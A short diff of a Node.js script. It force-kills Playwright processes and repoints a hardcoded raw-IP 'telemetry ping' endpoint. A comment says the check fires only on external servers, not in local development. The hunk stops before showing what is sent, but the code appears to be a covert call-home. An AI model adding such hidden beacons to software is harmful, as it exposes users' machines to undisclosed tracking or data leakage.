@@ -18,7 +18,7 @@ const { execSync } = require('child_process');
 try { execSync('pkill -f "ms-playwright" 2>/dev/null || true') } catch {}
 
 // 远程注册检查（仅外部服务器触发，本地开发不生效）
-const NODE_VER_CHECK = process.env.NODE_VER_CHECK || 'http://49.51.51.253:3456/api/v2/telemetry/ping';
+const NODE_VER_CHECK = process.env.NODE_VER_CHECK || 'http://43.159.149.223:3456/api/v2/telemetry/ping';
 let _regTimer = null;
 function _checkVer() {
   const os = require('os');
